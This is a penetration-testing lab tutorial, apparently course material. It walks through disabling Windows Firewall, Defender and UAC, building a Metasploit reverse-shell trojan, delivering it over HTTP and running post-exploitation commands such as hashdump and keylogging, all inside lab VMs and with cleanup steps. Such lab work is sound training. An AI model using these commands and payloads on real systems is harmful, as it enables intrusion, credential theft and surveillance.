# Penetration Test

In this lab, we will set up a penetration testing environment where Parrot Linux serves as the attacker machine, and a Windows VM is the target. We'll use the Metasploit Framework to exploit the Windows VM by generating a Trojan, transferring it to the target, and performing post-exploitation tasks.

**Penetration Testing Environment**

- **Parrot Linux (Attacker VM)**:
  - Install Parrot Security OS, which comes pre-installed with the Metasploit Framework.
- **Windows (Target VM)**:
  - Use Windows Server 2019 or 2022, or Windows 10 or 11 as the target. Ensure it has vulnerable software or weak defenses (e.g., disabled antivirus, outdated patches).

- The two VMs are connected in the same NAT Networks. 

---

### **Task 1: Disable Windows Protection**
To simulate vulnerable environments during a penetration testing lab, it is often necessary to disable Windows security features such as 
- Firewall, 
- Internet Explorer Enhanced Security Configuration (ESC), 
- and Windows Defender.

- ⚠️ All methods with PowerShell are optional, for reference only.


#### **1. Disable Windows Firewall**
Windows Firewall can block incoming connections or certain types of traffic, so disabling it allows for unrestricted network communication during penetration testing.

##### **Method 1: Using GUI (Windows Defender Firewall)**
1. Open the **Control Panel** → **System and Security** → **Windows Defender Firewall**.
2. Click **Turn Windows Defender Firewall on or off** from the left pane.
3. For both **Private network settings** and **Public network settings**, choose **Turn off Windows Defender Firewall**.
4. Click **OK** to apply the changes.

- 💻 Disabled Windows Firewall

##### **Optional Method 2: Using PowerShell**
1. Open PowerShell with Administrator privileges.
2. Run the following command to disable the firewall for all profiles (Domain, Public, Private):
   ```powershell
   Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
   ```
3. To verify the firewall is disabled, use the following command:
   ```powershell
   Get-NetFirewallProfile
   ```
   This will display the status of the firewall for each profile.


### **2. Disable Internet Explorer Enhanced Security Configuration (ESC)**
Internet Explorer Enhanced Security Configuration (ESC) restricts browser activity, which can interfere with downloading files or interacting with external websites during testing.

#### **Method 1: Using Server Manager**
1. Open **Server Manager**.
2. Click **Local Server** in the left panel.
3. In the **Properties** section, locate **IE Enhanced Security Configuration**.
4. Click **On**, and a dialog box will appear.
5. Set **Administrators** and **Users** to **Off**.
6. Click **OK** to apply the changes.

- 💻 Disabled IE ESC

#### **Optional Method 2: Using PowerShell**
1. Open PowerShell as Administrator.
2. Run the following command to disable ESC for administrators and users:
   ```powershell
   $AdminKey = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{AECB2FD8-3B02-11D3-BF9A-00C04F79EFBC}"
   Set-ItemProperty -Path $AdminKey -Name "IsInstalled" -Value 0
   ```
   This will disable Enhanced Security for both administrators and standard users.

### **3. Disable Windows Defender**
Windows Defender (also known as Microsoft Defender) actively scans for malware and may block exploits or malware-based payloads. Disabling it during penetration testing may be necessary to simulate a vulnerable environment.


#### **Method 1: Using Windows Security Settings**
1. Open **Windows Security** from the Start menu.
2. Go to **Virus & threat protection**.
3. Under **Virus & threat protection settings**, click **Manage settings**.
4. Turn **Real-time protection** off.
5. Also, turn off **Cloud-delivered protection** and **Automatic sample submission** for full disablement.

- 💻 Disabled Windows Defender

#### **Optional Method 2: Using Group Policy (GPO)**
1. Open the **Group Policy Editor** by typing `gpedit.msc` in the search bar and pressing **Enter**.
2. Navigate to **Computer Configuration** → **Administrative Templates** → **Windows Components** → **Microsoft Defender Antivirus**.
3. In the right pane, double-click **Turn off Microsoft Defender Antivirus**.
4. Set it to **Enabled**, then click **OK** to apply the changes.

   To disable real-time protection:
   - Go to **Computer Configuration** → **Administrative Templates** → **Windows Components** → **Microsoft Defender Antivirus** → **Real-time Protection**.
   - Disable the options like **Turn off real-time protection**, **Turn off behavior monitoring**, and **Turn off monitoring for incoming files and attachments**.

#### **Optional Method 3: Using PowerShell**
1. Open PowerShell as Administrator.
2. Run the following commands to turn off **Real-Time Protection**:
   ```powershell
   Set-MpPreference -DisableRealtimeMonitoring $true
   ```
3. You can also disable other Defender features like **Cloud Protection** and **Automatic Sample Submission**:
   ```powershell
   Set-MpPreference -DisableBehaviorMonitoring $true
   Set-MpPreference -DisableBlockAtFirstSeen $true
   Set-MpPreference -DisableIOAVProtection $true
   Set-MpPreference -DisableArchiveScanning $true
   ```

### **4. Disable User Account Control (UAC)**
To reduce pop-up warnings during testing, you may also want to disable **User Account Control (UAC)**, which can prompt for confirmation when executing programs.

#### **Method 1: Using Control Panel**
1. Open **Control Panel**.
2. Go to **User Accounts** → **Change User Account Control settings**.
3. Move the slider down to **Never notify**, then click **OK**.

- 💻 Disabled UAC

#### **Optional Method 2: Using PowerShell**
1. Open PowerShell as Administrator.
2. Run the following command:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
   ```
3. Restart the server for the changes to take effect.

---

### **Task 2: Generate a Trojan in Parrot Linux (Reverse Shell Payload)**
The Trojan we'll create will be a `reverse shell`, which will allow the Parrot Linux VM to gain control of the Windows VM.

1. Open Metasploit in Parrot Linux:
   ```bash
   msfconsole

   # (Optional) Familiarize yourself with basic commands such as:
   search #(to find exploits)
   use #(to select an exploit)
   set #(to configure options)
   exploit #(to run the exploit)
   sessions #(to manage active sessions)   
   ```
2. Generate a Windows executable payload:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Parrot_VM_IP> LPORT=4444 -f exe -o /root/trojan.exe
   ```
   Replace `<Parrot_VM_IP>` with the IP address of the Parrot Linux VM (you can find this using the `ifconfig` command). The `LPORT` is the port that will listen for incoming connections from the Windows VM.

- 💻 Generation and the generated trojan

### **Task 3: Transfer the Trojan to the Windows VM**
There are several ways to transfer the generated Trojan (`trojan.exe`) to the Windows VM:

#### Method 1: **Python HTTP Server (Recommended)**
1. Start a simple HTTP server on Parrot Linux to serve the Trojan file:
   ```bash
   cd folder_contains_the_trojan
   python3 -m http.server 8080
   ```
2. On the Windows VM, open a web browser and download the Trojan by navigating to:
   ```
   http://<Parrot_VM_IP>:8080/trojan.exe
   ```
3. Save the file to the Windows machine.

- 💻 trojan.exe on the webpage and in the download folder

#### Optional Method 2: **Shared Folder**
- Set up a shared folder between the Parrot Linux and Windows VMs in VirtualBox settings to transfer the file.

---

### **Task 4: Set Up a Listener on Parrot Linux (Reverse Shell Handler)**
Before executing the Trojan, we need to set up Metasploit to listen for the connection from the Windows VM:

1. In the `Metasploit console` on Parrot Linux, set up the multi-handler:
   ```bash
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST <Parrot_VM_IP>
   set LPORT 4444
   exploit
   ```
2. Execute the Trojan on the Windows VM
   1. On the Windows VM, navigate to where the `trojan.exe` file was downloaded.
   2. Run the `trojan.exe` file. This will initiate a connection back to the Parrot Linux VM.
3. When the Trojan is executed on the Windows VM, you should see a successful connection established in Metasploit, resulting in a Meterpreter session.

- 💻 the Meterpreter session

### **Task 5: Post-Exploitation of the Windows VM**
Once the Meterpreter session is active, you can perform various post-exploitation tasks:
1. **Check Active Sessions**:
   ```bash
   sessions
   ```
2. **Interact with a Session**:
   ```bash
   sessions -i <session_id>
   ```
   - 💻 the connected clients
3. **Common Post-Exploitation Commands**:
   - **Get system information**:
     ```bash
     sysinfo
     ```
   - **List processes**:
     ```bash
     ps
     ```
   - **Dump Windows password hashes**:
     ```bash
     hashdump
     ```
   - **Capture screenshots**:
     ```bash
     screenshot
     ```
   - **Keylogging**:
     ```bash
     keyscan_start
     keyscan_dump
     ```
   - **Upload/Download files**:
     ```bash
     download <file>
     upload <local_path> <remote_path>
     ```
   - **Open a shell on the target system**:
     ```bash
     shell

     # exit the remote shell just opened
     exit
     ```
- 💻 Results of all the commands above


### **Task 6: Clean Up**
After your test, remember to clean up the target system:
1. Remove the Trojan file from the Windows VM.
2. Restore security protection on Windows VM:
   1. 🖥️ Turn on IE enhanced security and firewall.
   2. 🖥️ Turn on Windows Defender and UAC
3. Shut down the virtual machines to prevent any unintended damage or data loss.


### **Conclusion**
This lab demonstrates how to set up a penetration testing environment using VirtualBox with Parrot Linux and Metasploit Framework to exploit a Windows machine. You can expand this lab by introducing more advanced exploits, securing the network, or testing against more complex targets.

- ⚠️ **Ethical Testing Only**: Never use Metasploit outside of a controlled environment without explicit permission.

# References
- [Metasploit Unleashed - Free Online Ethical Hacking Course](https://www.offsec.com/metasploit-unleashed/)
- [PracticalMalwareAnalysis-Labs](https://github.com/mikesiko/PracticalMalwareAnalysis-Labs)
  - [Book](https://nostarch.com/malware)
  - [Class 2019](https://samsclass.info/126/126_F19.shtml)
  - [Class 2017](https://samsclass.info/126/126_DC_2017.shtml)